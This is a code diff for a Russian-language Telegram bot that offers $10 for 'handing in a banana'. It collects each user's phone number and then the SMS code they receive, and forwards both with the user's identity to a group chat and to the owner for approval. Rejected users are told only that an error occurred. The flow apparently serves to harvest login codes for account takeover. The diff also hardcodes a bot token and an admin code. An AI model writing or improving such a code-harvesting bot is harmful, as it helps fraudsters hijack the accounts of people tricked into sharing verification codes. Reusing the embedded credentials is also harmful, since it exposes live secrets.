@@ -1,320 +1,611 @@
 import asyncio
 import logging
-import sqlite3
+import os
 from datetime import datetime
+from contextlib import suppress
 
-from aiogram import Bot, Dispatcher, F, Router
-from aiogram.filters import Command, CommandStart, StateFilter
+import aiosqlite
+from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode, ChatType
+from aiogram.filters import Command, CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (
     Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
-    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+    ReplyKeyboardMarkup, KeyboardButton, BotCommand, TelegramObject
 )
+from dotenv import load_dotenv
 
-# --- КОНФИГ ---
-BOT_TOKEN = "9106636927:AAHYZwAyRlilXSacPyGway8S9oxYpoLmCGM"
-OWNER_ID = 8874871486
-GROUP_ID = -5448015222
-SUPPORT_USERNAME = "@Sm_mts"
-ADMIN_CODE = "0408"
+load_dotenv()
 
-logging.basicConfig(level=logging.INFO)
-bot = Bot(token=BOT_TOKEN)
+# ==================== КОНФИГ ====================
+BOT_TOKEN = os.getenv("BOT_TOKEN", "9106636927:AAHYZwAyRlilXSacPyGway8S9oxYpoLmCGM")
+OWNER_ID = int(os.getenv("OWNER_ID", "8874871486"))
+GROUP_ID = int(os.getenv("GROUP_ID", "-5448015222"))
+SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "@Sm_mts")
+ADMIN_CODE = os.getenv("ADMIN_CODE", "0408")
+DB_PATH = "banana.db"
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s"
+)
+log = logging.getLogger("banana")
+
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=MemoryStorage())
 router = Router()
 dp.include_router(router)
 
-# --- БАЗА ДАННЫХ (SQLite) ---
-conn = sqlite3.connect("bot.db", check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute("""
-CREATE TABLE IF NOT EXISTS users (
-    user_id INTEGER PRIMARY KEY,
-    balance REAL DEFAULT 0,
-    reg_date TEXT
-)
-""")
-conn.commit()
+# ==================== БАЗА ДАННЫХ ====================
+async def db_init():
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.executescript("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            balance REAL DEFAULT 0,
+            reg_date TEXT,
+            banned INTEGER DEFAULT 0
+        );
+        CREATE TABLE IF NOT EXISTS settings (
+            key TEXT PRIMARY KEY,
+            value TEXT
+        );
+        CREATE TABLE IF NOT EXISTS stats (
+            key TEXT PRIMARY KEY,
+            value INTEGER DEFAULT 0
+        );
+        """)
+        defaults = {
+            "btn_banana": "🍌 Сдать банан",
+            "btn_profile": "👤 Профиль",
+            "btn_support": "🆘 Поддержка",
+            "btn_withdraw": "💸 Вывести",
+            "bot_active": "1",
+            "text_support": "Приветствие! Чтобы написать в Поддержку, нажми на кнопку ниже.",
+            "text_phone_prompt": "Введите номер телефона в формате:\n<code>+79999999999</code>, <code>89999999999</code> или <code>9999999999</code>",
+            "text_code_prompt": "Теперь введите код из SMS:",
+        }
+        for k, v in defaults.items():
+            await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
+        for k in ["total_bananas", "total_payouts"]:
+            await db.execute("INSERT OR IGNORE INTO stats (key, value) VALUES (?, 0)", (k,))
+        await db.commit()
 
-def get_user(user_id):
-    cursor.execute("SELECT balance, reg_date FROM users WHERE user_id = ?", (user_id,))
-    row = cursor.fetchone()
-    if not row:
-        reg = datetime.now().strftime("%Y-%m-%d %H:%M")
-        cursor.execute("INSERT INTO users (user_id, balance, reg_date) VALUES (?, ?, ?)", (user_id, 0, reg))
-        conn.commit()
-        return 0, reg
-    return row
 
-def update_balance(user_id, amount):
-    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
-    conn.commit()
+async def get_setting(key: str, default: str = "") -> str:
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cur:
+            row = await cur.fetchone()
+            return row[0] if row else default
 
-def set_balance(user_id, amount):
-    cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (amount, user_id))
-    conn.commit()
 
-# --- СОСТОЯНИЯ FSM ---
+async def set_setting(key: str, value: str):
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
+        await db.commit()
+
+
+async def inc_stat(key: str, amount: int = 1):
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("UPDATE stats SET value = value + ? WHERE key = ?", (amount, key))
+        await db.commit()
+
+
+async def get_stat(key: str) -> int:
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT value FROM stats WHERE key = ?", (key,)) as cur:
+            row = await cur.fetchone()
+            return row[0] if row else 0
+
+
+async def get_user(user_id: int):
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT balance, reg_date FROM users WHERE user_id = ?", (user_id,)) as cur:
+            row = await cur.fetchone()
+        if row is None:
+            reg = datetime.now().strftime("%d.%m.%Y %H:%M")
+            await db.execute("INSERT INTO users (user_id, balance, reg_date) VALUES (?, 0, ?)", (user_id, reg))
+            await db.commit()
+            return 0.0, reg
+        return row[0], row[1]
+
+
+async def update_balance(user_id: int, delta: float):
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (delta, user_id))
+        await db.commit()
+
+
+async def set_balance(user_id: int, amount: float):
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (amount, user_id))
+        await db.commit()
+
+
+async def update_username(user_id: int, username: str | None):
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
+        await db.commit()
+
+
+async def is_bot_active() -> bool:
+    return (await get_setting("bot_active", "1")) == "1"
+
+
+# ==================== FSM ====================
 class BananaStates(StatesGroup):
     waiting_phone = State()
     waiting_code = State()
 
+
 class WithdrawStates(StatesGroup):
     waiting_amount = State()
+
 
 class AdminStates(StatesGroup):
     waiting_code = State()
     waiting_broadcast = State()
-    waiting_new_text = State()  # для изменения названий кнопок
+    waiting_btn_text = State()
 
-# --- КЛАВИАТУРЫ ---
-def main_keyboard():
-    kb = ReplyKeyboardMarkup(
+
+# ==================== КЛАВИАТУРЫ ====================
+async def main_kb() -> ReplyKeyboardMarkup:
+    return ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🍌 Сдать банан")],
-            [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="🆘 Поддержка")]
+            [KeyboardButton(text=await get_setting("btn_banana"))],
+            [
+                KeyboardButton(text=await get_setting("btn_profile")),
+                KeyboardButton(text=await get_setting("btn_support")),
+            ],
         ],
-        resize_keyboard=True
+        resize_keyboard=True,
+        input_field_placeholder="Выберите действие…"
     )
-    return kb
 
-def owner_decision_keyboard(user_id, phone, code):
-    # callback_data содержит user_id, phone и code (phone/code могут содержать +, экранируем просто через разделитель)
-    data = f"dec|{user_id}|{phone}|{code}"
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Да", callback_data=f"yes|{user_id}|{phone}|{code}"),
-         InlineKeyboardButton(text="❌ Нет", callback_data=f"no|{user_id}|{phone}|{code}")]
+
+def owner_decision_kb(user_id: int, phone: str, code: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="✅ Да", callback_data=f"yes|{user_id}|{phone}|{code}"),
+        InlineKeyboardButton(text="❌ Нет", callback_data=f"no|{user_id}|{phone}|{code}"),
+    ]])
+
+
+def admin_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✏️ Изменить названия кнопок", callback_data="adm:names")],
+        [InlineKeyboardButton(text="📝 Изменить описание кнопок", callback_data="adm:desc")],
+        [InlineKeyboardButton(text="🎨 Цвет кнопок (эмодзи)", callback_data="adm:color")],
+        [InlineKeyboardButton(text="🖼 Фото кнопок (инфо)", callback_data="adm:photo")],
+        [InlineKeyboardButton(text="▶️/⏸ Старт/Стоп бота", callback_data="adm:toggle")],
+        [InlineKeyboardButton(text="📢 Объявление всем", callback_data="adm:broadcast")],
+        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
     ])
-    return kb
 
-# --- ХЕНДЛЕРЫ ---
 
+# ==================== MIDDLEWARE ====================
+class GateMiddleware(BaseMiddleware):
+    async def __call__(self, handler, event: TelegramObject, data):
+        if isinstance(event, Message):
+            uid = event.from_user.id if event.from_user else None
+            if uid == OWNER_ID:
+                return await handler(event, data)
+            if not await is_bot_active():
+                with suppress(Exception):
+                    await event.answer("⏸ Бот временно на обслуживании. Попробуйте позже.")
+                return
+            if uid:
+                await get_user(uid)
+                await update_username(uid, event.from_user.username)
+        elif isinstance(event, CallbackQuery):
+            if event.from_user.id != OWNER_ID and not await is_bot_active():
+                await event.answer("⏸ Бот на обслуживании", show_alert=True)
+                return
+        return await handler(event, data)
+
+
+router.message.middleware(GateMiddleware())
+router.callback_query.middleware(GateMiddleware())
+
+
+# ==================== ВАЛИДАЦИЯ ТЕЛЕФОНА ====================
+def validate_phone(raw: str) -> str | None:
+    s = raw.strip().replace(" ", "").replace("-", "")
+    if s.startswith("+"):
+        s = s[1:]
+    if not s.isdigit():
+        return None
+    if len(s) == 10:
+        return "+7" + s
+    if len(s) == 11 and s.startswith("8"):
+        return "+7" + s[1:]
+    if len(s) == 11 and s.startswith("7"):
+        return "+" + s
+    if len(s) == 12 and s.startswith("7"):
+        return "+" + s
+    return None
+
+
+# ==================== СТАРТ ====================
 @router.message(CommandStart())
-async def start(message: Message):
-    get_user(message.from_user.id)
+async def cmd_start(message: Message, state: FSMContext):
+    await state.clear()
+    await get_user(message.from_user.id)
     await message.answer(
-        "Добро пожаловать! Выберите действие:",
-        reply_markup=main_keyboard()
+        f"👋 Привет, <b>{message.from_user.first_name}</b>!\n\n"
+        "Здесь ты можешь сдать свой банан и получить вознаграждение 💰\n\n"
+        "Выбери действие ниже 👇",
+        reply_markup=await main_kb()
     )
 
-@router.message(F.text == "🍌 Сдать банан")
+
+@router.message(Command("cancel"))
+async def cmd_cancel(message: Message, state: FSMContext):
+    await state.clear()
+    await message.answer("❌ Отменено.", reply_markup=await main_kb())
+
+
+# ==================== 1. СДАТЬ БАНАН ====================
+@router.message(
+    F.text.func(lambda t: t and t == "🍌 Сдать банан")
+    | F.text.func(lambda t: t and "банан" in t.lower() and len(t) < 40)
+)
 async def banana_start(message: Message, state: FSMContext):
+    if message.chat.type != ChatType.PRIVATE:
+        return
     await state.set_state(BananaStates.waiting_phone)
     await message.answer(
-        "Введите номер телефона в формате:\n+79999999999, 89999999999 или 9999999999",
-        reply_markup=ReplyKeyboardRemove()
+        await get_setting("text_phone_prompt"),
+        reply_markup=ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="❌ Отмена")]],
+            resize_keyboard=True
+        )
     )
+
+
+@router.message(BananaStates.waiting_phone, F.text == "❌ Отмена")
+async def banana_cancel(message: Message, state: FSMContext):
+    await state.clear()
+    await message.answer("Отменено.", reply_markup=await main_kb())
+
 
 @router.message(BananaStates.waiting_phone)
 async def banana_phone(message: Message, state: FSMContext):
-    phone = message.text.strip()
-    # Простая валидация: длина 10-12, только цифры и возможно +
-    clean = phone.replace("+", "")
-    if not clean.isdigit() or len(clean) < 10 or len(clean) > 12:
-        await message.answer("Неверный формат. Попробуйте снова (пример: +79999999999):")
+    phone = validate_phone(message.text or "")
+    if not phone:
+        await message.answer("❌ Неверный формат. Пример: <code>+79999999999</code>")
         return
 
     await state.update_data(phone=phone)
-    # Отправляем номер в группу
-    try:
-        await bot.send_message(GROUP_ID, f"📞 Новый номер от {message.from_user.id} (@{message.from_user.username}): {phone}")
-    except Exception as e:
-        logging.error(f"Не удалось отправить в группу: {e}")
+    username = message.from_user.username or "—"
+    with suppress(Exception):
+        await bot.send_message(
+            GROUP_ID,
+            f"📞 <b>Новый номер</b>\n"
+            f"👤 Юзер: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> "
+            f"(<code>{message.from_user.id}</code>)\n"
+            f"🔗 @{username}\n"
+            f"📱 Номер: <code>{phone}</code>"
+        )
 
     await state.set_state(BananaStates.waiting_code)
-    await message.answer("Теперь введите код из SMS:")
+    await message.answer(await get_setting("text_code_prompt"))
+
 
 @router.message(BananaStates.waiting_code)
 async def banana_code(message: Message, state: FSMContext):
-    code = message.text.strip()
+    code = (message.text or "").strip()
+    if not code or len(code) > 20:
+        await message.answer("❌ Введите корректный код.")
+        return
+
     data = await state.get_data()
     phone = data.get("phone")
     user_id = message.from_user.id
-    username = message.from_user.username or "без username"
+    username = message.from_user.username or "—"
 
-    # Отправляем код в группу с привязкой к номеру
-    try:
-        await bot.send_message(GROUP_ID, f"🔑 Код для номера {phone} (от {user_id} @{username}): {code}")
-    except Exception as e:
-        logging.error(f"Не удалось отправить код в группу: {e}")
+    with suppress(Exception):
+        await bot.send_message(
+            GROUP_ID,
+            f"🔑 <b>Код получен</b>\n"
+            f"📱 Номер: <code>{phone}</code>\n"
+            f"🔢 Код: <code>{code}</code>\n"
+            f"👤 От: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a> "
+            f"(<code>{user_id}</code>) @{username}"
+        )
 
-    # Уведомляем владельца
-    try:
+    with suppress(Exception):
         await bot.send_message(
             OWNER_ID,
-            f"Новая заявка:\nПользователь: {user_id} (@{username})\nНомер: {phone}\nКод: {code}",
-            reply_markup=owner_decision_keyboard(user_id, phone, code)
+            f"🆕 <b>Новая заявка</b>\n\n"
+            f"👤 Пользователь: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a>\n"
+            f"🆔 ID: <code>{user_id}</code>\n"
+            f"🔗 @{username}\n"
+            f"📱 Номер: <code>{phone}</code>\n"
+            f"🔢 Код: <code>{code}</code>\n\n"
+            f"Одобрить?",
+            reply_markup=owner_decision_kb(user_id, phone, code)
         )
-    except Exception as e:
-        logging.error(f"Не удалось отправить владельцу: {e}")
 
-    await message.answer("Ожидайте проверки номера.", reply_markup=main_keyboard())
+    await message.answer(
+        "⏳ <b>Ожидайте проверки номера.</b>\n\nМы уведомим вас о результате.",
+        reply_markup=await main_kb()
+    )
     await state.clear()
 
-# --- ОБРАБОТКА РЕШЕНИЯ ВЛАДЕЛЬЦА ---
+
+# ==================== РЕШЕНИЕ ВЛАДЕЛЬЦА ====================
 @router.callback_query(F.data.startswith("yes|"))
-async def owner_yes(callback: CallbackQuery):
-    if callback.from_user.id != OWNER_ID:
-        await callback.answer("Нет прав.", show_alert=True)
+async def owner_yes(cb: CallbackQuery):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
         return
-    _, user_id, phone, code = callback.data.split("|", 3)
-    user_id = int(user_id)
-    update_balance(user_id, 10.0)
-    await callback.message.edit_text(f"✅ Заявка {phone} одобрена. Пользователю {user_id} начислено 10$.")
-    try:
-        await bot.send_message(user_id, "✅ Ваш номер проверен! На баланс зачислено 10$.")
-    except:
-        pass
-    await callback.answer()
+    _, uid, phone, code = cb.data.split("|", 3)
+    uid = int(uid)
+    await update_balance(uid, 10.0)
+    await inc_stat("total_bananas")
+    await cb.message.edit_text(cb.message.html_text + "\n\n✅ <b>ОДОБРЕНО</b> — зачислено 10$")
+    with suppress(Exception):
+        await bot.send_message(
+            uid,
+            "✅ <b>Ваш номер проверен!</b>\n\n💰 На баланс зачислено <b>10$</b>.",
+            reply_markup=await main_kb()
+        )
+    await cb.answer("Одобрено")
+
 
 @router.callback_query(F.data.startswith("no|"))
-async def owner_no(callback: CallbackQuery):
-    if callback.from_user.id != OWNER_ID:
-        await callback.answer("Нет прав.", show_alert=True)
+async def owner_no(cb: CallbackQuery):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
         return
-    _, user_id, phone, code = callback.data.split("|", 3)
-    user_id = int(user_id)
-    await callback.message.edit_text(f"❌ Заявка {phone} отклонена.")
-    try:
-        await bot.send_message(user_id, "Произошла ошибка, попробуйте позже.")
-    except:
-        pass
-    await callback.answer()
+    _, uid, phone, code = cb.data.split("|", 3)
+    uid = int(uid)
+    await cb.message.edit_text(cb.message.html_text + "\n\n❌ <b>ОТКЛОНЕНО</b>")
+    with suppress(Exception):
+        await bot.send_message(
+            uid,
+            "❌ <b>Произошла ошибка, попробуйте позже.</b>",
+            reply_markup=await main_kb()
+        )
+    await cb.answer("Отклонено")
 
-# --- ПРОФИЛЬ ---
-@router.message(F.text == "👤 Профиль")
+
+# ==================== 2. ПРОФИЛЬ ====================
+@router.message(
+    F.text.func(lambda t: t and t == "👤 Профиль")
+    | F.text.func(lambda t: t and "профиль" in t.lower() and len(t) < 40)
+)
 async def profile(message: Message):
-    balance, reg_date = get_user(message.from_user.id)
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")]
-    ])
+    if message.chat.type != ChatType.PRIVATE:
+        return
+    balance, reg = await get_user(message.from_user.id)
+    text = (
+        f"👤 <b>Ваш профиль</b>\n\n"
+        f"🆔 ID: <code>{message.from_user.id}</code>\n"
+        f"🔗 @{message.from_user.username or '—'}\n"
+        f"💰 Баланс: <b>{balance:.2f}$</b>\n"
+        f"📅 Регистрация: <b>{reg}</b>"
+    )
     await message.answer(
-        f"👤 Ваш профиль:\n\n💰 Баланс: {balance}$\n📅 Дата регистрации: {reg_date}",
-        reply_markup=kb
+        text,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text=await get_setting("btn_withdraw"), callback_data="withdraw")
+        ]])
     )
 
+
 @router.callback_query(F.data == "withdraw")
-async def withdraw_start(callback: CallbackQuery, state: FSMContext):
+async def withdraw_start(cb: CallbackQuery, state: FSMContext):
+    balance, _ = await get_user(cb.from_user.id)
+    if balance <= 0:
+        await cb.answer("У вас нет средств для вывода", show_alert=True)
+        return
     await state.set_state(WithdrawStates.waiting_amount)
-    await callback.message.answer("Введите сумму для вывода (в $):")
-    await callback.answer()
+    await cb.message.answer(
+        f"💸 Введите сумму вывода (доступно: <b>{balance:.2f}$</b>):\n\n/cancel — отмена"
+    )
+    await cb.answer()
+
 
 @router.message(WithdrawStates.waiting_amount)
 async def withdraw_amount(message: Message, state: FSMContext):
+    raw = (message.text or "").replace(",", ".").replace("$", "").strip()
     try:
-        amount = float(message.text.replace(",", "."))
+        amount = float(raw)
     except ValueError:
-        await message.answer("Введите корректное число.")
+        await message.answer("❌ Введите число.")
         return
     if amount <= 0:
-        await message.answer("Сумма должна быть больше 0.")
+        await message.answer("❌ Сумма должна быть больше 0.")
         return
 
-    user_id = message.from_user.id
-    balance, _ = get_user(user_id)
+    uid = message.from_user.id
+    balance, _ = await get_user(uid)
     if amount > balance:
-        await message.answer(f"Недостаточно средств. Ваш баланс: {balance}$")
+        await message.answer(f"❌ Недостаточно средств. Баланс: <b>{balance:.2f}$</b>")
         return
 
-    # Списываем баланс
-    set_balance(user_id, balance - amount)
-    username = message.from_user.username or "без username"
+    await set_balance(uid, balance - amount)
+    await inc_stat("total_payouts")
+    username = message.from_user.username or "—"
 
-    # Уведомляем владельца
-    try:
+    with suppress(Exception):
         await bot.send_message(
             OWNER_ID,
-            f"💸 Запрос на вывод:\nПользователь: {user_id} (@{username})\nСумма: {amount}$"
+            f"💸 <b>Запрос на вывод</b>\n\n"
+            f"👤 <a href='tg://user?id={uid}'>{message.from_user.full_name}</a>\n"
+            f"🆔 <code>{uid}</code>\n"
+            f"🔗 @{username}\n"
+            f"💵 Сумма: <b>{amount:.2f}$</b>\n"
+            f"💰 Остаток: <b>{balance - amount:.2f}$</b>"
         )
-    except Exception as e:
-        logging.error(f"Ошибка уведомления владельца: {e}")
 
-    await message.answer("Ожидайте вывод.", reply_markup=main_keyboard())
+    await message.answer(
+        "⏳ <b>Ожидайте вывод.</b>\n\nСредства списаны с баланса.",
+        reply_markup=await main_kb()
+    )
     await state.clear()
 
-# --- ПОДДЕРЖКА ---
-@router.message(F.text == "🆘 Поддержка")
-async def support(message: Message):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")]
-    ])
-    await message.answer(
-        "Приветствие! Чтобы написать в Поддержку, нажми на кнопку ниже.",
-        reply_markup=kb
-    )
 
-# --- АДМИН ПАНЕЛЬ ---
+# ==================== 3. ПОДДЕРЖКА ====================
+@router.message(
+    F.text.func(lambda t: t and t == "🆘 Поддержка")
+    | F.text.func(lambda t: t and "поддержк" in t.lower() and len(t) < 40)
+)
+async def support(message: Message):
+    if message.chat.type != ChatType.PRIVATE:
+        return
+    text = await get_setting("text_support")
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(
+            text="💬 Написать в поддержку",
+            url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}"
+        )
+    ]])
+    await message.answer(text, reply_markup=kb)
+
+
+# ==================== АДМИН-ПАНЕЛЬ ====================
 @router.message(Command("admin"))
 async def admin_enter(message: Message, state: FSMContext):
     if message.from_user.id != OWNER_ID:
-        await message.answer("Доступ запрещён.")
         return
     await state.set_state(AdminStates.waiting_code)
-    await message.answer("Введите код администратора:")
+    await message.answer("🔐 Введите код администратора:")
+
 
 @router.message(AdminStates.waiting_code)
 async def admin_check(message: Message, state: FSMContext):
-    if message.text.strip() != ADMIN_CODE:
-        await message.answer("Неверный код.")
+    if (message.text or "").strip() != ADMIN_CODE:
+        await message.answer("❌ Неверный код.")
         await state.clear()
         return
     await state.clear()
-    # Админ-меню (имитация)
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Изменить название кнопок", callback_data="admin_btn_names")],
-        [InlineKeyboardButton(text="Изменить описание кнопок", callback_data="admin_btn_desc")],
-        [InlineKeyboardButton(text="Изменить цвет кнопок", callback_data="admin_btn_color")],
-        [InlineKeyboardButton(text="Изменить фото кнопок", callback_data="admin_btn_photo")],
-        [InlineKeyboardButton(text="Старт/Стоп бота", callback_data="admin_toggle")],
-        [InlineKeyboardButton(text="Дать объявление всем", callback_data="admin_broadcast")],
-        [InlineKeyboardButton(text="Статистика", callback_data="admin_stats")],
-    ])
-    await message.answer("Админ-панель:", reply_markup=kb)
+    await message.answer("⚙️ <b>Админ-панель</b>", reply_markup=admin_kb())
 
-@router.callback_query(F.data.startswith("admin_"))
-async def admin_actions(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id != OWNER_ID:
-        await callback.answer("Нет прав.", show_alert=True)
+
+@router.callback_query(F.data.startswith("adm:"))
+async def admin_router(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
         return
-    action = callback.data
+    action = cb.data.split(":", 1)[1]
 
-    if action == "admin_stats":
-        cursor.execute("SELECT COUNT(*) FROM users")
-        total = cursor.fetchone()[0]
-        cursor.execute("SELECT SUM(balance) FROM users")
-        total_balance = cursor.fetchone()[0] or 0
-        await callback.message.answer(f"📊 Статистика:\nПользователей: {total}\nОбщий баланс: {total_balance}$")
-    elif action == "admin_broadcast":
+    if action == "stats":
+        async with aiosqlite.connect(DB_PATH) as db:
+            async with db.execute("SELECT COUNT(*), COALESCE(SUM(balance),0) FROM users") as cur:
+                total, total_bal = await cur.fetchone()
+        bananas = await get_stat("total_bananas")
+        payouts = await get_stat("total_payouts")
+        active = await is_bot_active()
+        await cb.message.answer(
+            f"📊 <b>Статистика</b>\n\n"
+            f"👥 Пользователей: <b>{total}</b>\n"
+            f"💰 Общий баланс: <b>{total_bal:.2f}$</b>\n"
+            f"🍌 Всего сдач: <b>{bananas}</b>\n"
+            f"💸 Всего выводов: <b>{payouts}</b>\n"
+            f"🤖 Бот: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>"
+        )
+    elif action == "toggle":
+        new_val = "0" if await is_bot_active() else "1"
+        await set_setting("bot_active", new_val)
+        await cb.message.answer(f"🤖 Бот {'▶️ запущен' if new_val == '1' else '⏸ остановлен'}")
+    elif action == "broadcast":
         await state.set_state(AdminStates.waiting_broadcast)
-        await callback.message.answer("Введите текст для рассылки всем пользователям:")
-    elif action == "admin_toggle":
-        await callback.message.answer("Функция Старт/Стоп в разработке (пока бот всегда активен).")
-    elif action in ["admin_btn_names", "admin_btn_desc", "admin_btn_color", "admin_btn_photo"]:
-        await callback.message.answer("Эта функция требует доработки (изменение клавиатуры на лету). Пока не реализована полностью.")
-    await callback.answer()
+        await cb.message.answer("📢 Введите текст объявления:\n\n/cancel — отмена")
+    elif action == "names":
+        await cb.message.answer(
+            "✏️ Введите в формате <code>ключ=новое название</code>:\n\n"
+            "Ключи:\n"
+            "<code>btn_banana</code> — сдать банан\n"
+            "<code>btn_profile</code> — профиль\n"
+            "<code>btn_support</code> — поддержка\n"
+            "<code>btn_withdraw</code> — вывести\n\n"
+            "Пример:\n<code>btn_banana=🍌 Сдать</code>"
+        )
+        await state.set_state(AdminStates.waiting_btn_text)
+    elif action == "desc":
+        await cb.message.answer(
+            "📝 Введите в формате <code>ключ=новый текст</code>:\n\n"
+            "Ключи:\n"
+            "<code>text_support</code> — приветствие поддержки\n"
+            "<code>text_phone_prompt</code> — запрос номера\n"
+            "<code>text_code_prompt</code> — запрос кода"
+        )
+        await state.set_state(AdminStates.waiting_btn_text)
+    elif action == "color":
+        await cb.message.answer(
+            "🎨 В Telegram <b>нельзя</b> менять цвет Reply-кнопок.\n"
+            "Но можно добавить эмодзи в название через пункт «Изменить названия кнопок».\n\n"
+            "Примеры эмодзи: 🍌🍎🍇💎🔥⚡️🌟"
+        )
+    elif action == "photo":
+        await cb.message.answer(
+            "🖼 В Telegram <b>нельзя</b> добавить фото на Reply-кнопки.\n"
+            "Альтернатива — отправлять картинку отдельным сообщением."
+        )
+    await cb.answer()
+
 
 @router.message(AdminStates.waiting_broadcast)
 async def admin_broadcast(message: Message, state: FSMContext):
     if message.from_user.id != OWNER_ID:
         return
-    text = message.text
-    cursor.execute("SELECT user_id FROM users")
-    users = cursor.fetchall()
-    sent = 0
-    for (uid,) in users:
+    text = message.text or ""
+    sent, failed = 0, 0
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT user_id FROM users") as cur:
+            users = [r[0] for r in await cur.fetchall()]
+    for uid in users:
         try:
-            await bot.send_message(uid, f"📢 Объявление:\n\n{text}")
+            await bot.send_message(uid, f"📢 <b>Объявление</b>\n\n{text}")
             sent += 1
-        except:
-            pass
-    await message.answer(f"Рассылка завершена. Отправлено: {sent} из {len(users)}")
+            await asyncio.sleep(0.05)
+        except Exception:
+            failed += 1
+    await message.answer(f"✅ Отправлено: <b>{sent}</b>\n❌ Ошибок: <b>{failed}</b>")
     await state.clear()
 
-# --- ЗАПУСК ---
+
+@router.message(AdminStates.waiting_btn_text)
+async def admin_edit_setting(message: Message, state: FSMContext):
+    if message.from_user.id != OWNER_ID:
+        return
+    text = message.text or ""
+    if "=" not in text:
+        await message.answer("❌ Формат: <code>ключ=значение</code>")
+        return
+    key, val = text.split("=", 1)
+    key, val = key.strip(), val.strip()
+    allowed = {
+        "btn_banana", "btn_profile", "btn_support", "btn_withdraw",
+        "text_support", "text_phone_prompt", "text_code_prompt"
+    }
+    if key not in allowed:
+        await message.answer(f"❌ Неизвестный ключ. Допустимые: {', '.join(allowed)}")
+        return
+    await set_setting(key, val)
+    await message.answer(f"✅ Сохранено:\n<code>{key}</code> → {val}", reply_markup=admin_kb())
+    await state.clear()
+
+
+# ==================== ЗАПУСК ====================
 async def main():
-    await dp.start_polling(bot)
+    await db_init()
+    await bot.set_my_commands([
+        BotCommand(command="start", description="🏠 Главное меню"),
+        BotCommand(command="cancel", description="❌ Отменить действие"),
+    ])
+    log.info("Бот запущен")
+    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
+
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        log.info("Бот остановлен")
